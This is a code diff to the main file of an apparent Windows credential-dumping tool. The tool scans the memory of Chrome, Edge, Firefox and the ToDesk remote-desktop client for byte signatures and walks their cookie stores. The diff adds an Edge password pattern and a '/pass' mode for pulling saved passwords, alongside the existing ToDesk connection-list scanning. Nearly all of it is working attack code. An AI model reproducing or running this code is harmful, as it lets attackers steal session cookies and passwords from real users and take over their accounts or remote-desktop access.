@@ -5,6 +5,7 @@
 #include "Application.h"
 #include "Process.h"
 #pragma comment(lib, "shlwapi.lib")
+
 int main(int argc, char* argv[]) {
     banner();
 #ifndef _WIN64
@@ -15,8 +16,7 @@ int main(int argc, char* argv[]) {
     DWORD pid = 0;
     BOOL isBrowser = FALSE;
     BOOL validArg = FALSE;
-    BOOL debug = FALSE;
-    ToDeskMode mode = Normal;
+    AppMode mode = Normal;
     for (size_t i = 1; i < argc; i++)
     {
         if (StrStrIA(argv[i], "/edge") != NULL) {
@@ -42,7 +42,7 @@ int main(int argc, char* argv[]) {
             mode = List;
         }
         else if (StrStrIA(argv[i], "/pass") != NULL) {
-            mode = ListWithPass;
+            mode = Pass;
         }
         else if (StrStrIA(argv[i], "help") != NULL || StrStrIA(argv[i], "-h") != NULL) {
             usage();
@@ -72,6 +72,16 @@ int main(int argc, char* argv[]) {
         0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
         0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
         0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+    };
+    BYTE EdgePassPattern[] = {
+        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
+        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
+        0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
+        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
+        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
+        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
     };
     BYTE FirefoxPattern[] = {
         0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0x00, 0xAA, 0x00, 0xAA, 0x00,
@@ -123,56 +133,58 @@ int main(int argc, char* argv[]) {
         0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
         0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     };
-    if (targetApp == Chrome)
-    {
+    switch (targetApp) {
+    case Chrome:
         PRINT("[*] Targeting Chrome\n");
         targetProcess = L"chrome.exe";
         targetDll = L"chrome.dll";
         pattern = ChromePattern;
         szPattern = 192;
-    }
-    else if (targetApp == FireFox) {
+        break;
+    case Edge:
+        PRINT("[*] Targeting Edge\n");
+        targetProcess = L"msedge.exe";
+        targetDll = L"msedge.dll";
+        if (mode == Pass) {
+            pattern = EdgePassPattern;
+            szPattern = 128;
+        }
+        else {
+            pattern = ChromePattern;
+            szPattern = 192;
+        }
+        break;
+    case FireFox:
         PRINT("[*] Targeting FireFox\n");
         targetProcess = L"firefox.exe";
         targetDll = L"xul.dll";
         pattern = FirefoxPattern;
         szPattern = 88;
-    }
-    else if (targetApp == Edge) {
-        PRINT("[*] Targeting Edge\n");
-        targetProcess = L"msedge.exe";
-        targetDll = L"msedge.dll";
-        pattern = ChromePattern;
-        szPattern = 192;
-    }
-    else if (targetApp == ToDesk) {
+        break;
+    case ToDesk:
         PRINT("[*] Targeting ToDesk\n");
         targetProcess = L"ToDesk.exe";
         targetDll = L"zrtc.dll";
-        switch (mode)
-        {
-        case ListWithPass:
-            pattern = ToDeskListPassPattern;
-            szPattern = 128;
+        if (mode == Normal) {
+            pattern = ToDeskPattern;
+            szPattern = 288;
             break;
-        case List:
+        }
+        if (mode == List) {
             pattern = ToDeskListPattern;
             szPattern = 160;
             break;
-        case Normal:
-        default:
-            pattern = ToDeskPattern;
-            szPattern = 256;
+        }
+        if (mode == Pass) {
+            pattern = ToDeskListPassPattern;
+            szPattern = 128;
             break;
         }
-    }
-    else {
-        PRINT("[-] Unknow config\n");
     }
 
     if (pid == 0)
     {
-        if (!FindProcessPID(targetProcess, &pid, &hProcess) || hProcess == NULL)
+        if (!FindProcessPID(targetProcess, &pid, &hProcess, mode) || hProcess == NULL)
         {
             PRINT("[-] Failed to find right process!\n");
             return 1;
@@ -206,8 +218,14 @@ int main(int argc, char* argv[]) {
     ConvertToByteArray(targetSection, browserDllPattern, sizeof(uintptr_t));
 
     if (targetApp == Chrome or targetApp == Edge) {
-        PatchPattern(pattern, browserDllPattern, 8);
-        PatchPattern(pattern, browserDllPattern, 160);
+        if (mode == Pass) {
+            PatchPattern(pattern, browserDllPattern, 8);
+        }
+        else
+        {
+            PatchPattern(pattern, browserDllPattern, 8);
+            PatchPattern(pattern, browserDllPattern, 160);
+        }
     }
     else if (targetApp == FireFox)
     {
@@ -219,7 +237,7 @@ int main(int argc, char* argv[]) {
 
     uintptr_t* MatchedPatternInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 1000);
     size_t szMatchedPattern = 0;
-    if (MatchedPatternInstances == NULL || !FindPattern(hProcess, pattern, szPattern, MatchedPatternInstances, szMatchedPattern, isBrowser))
+    if (MatchedPatternInstances == NULL || !FindPattern(hProcess, pattern, szPattern, MatchedPatternInstances, szMatchedPattern, targetApp, mode))
     {
         PRINT("[-] Failed to find pattern\n");
         CloseHandle(hProcess);
@@ -250,7 +268,7 @@ int main(int argc, char* argv[]) {
         PRINTW(TEXT("[*] Pattern should be found in address 0x%p\n"), (void*)PatternOffset);
 #endif
         if (isBrowser) {
-            WalkCookieMap(hProcess, PatternOffset, targetApp);
+            WalkCookieMap(hProcess, PatternOffset, targetApp, mode);
         }
         else
         {
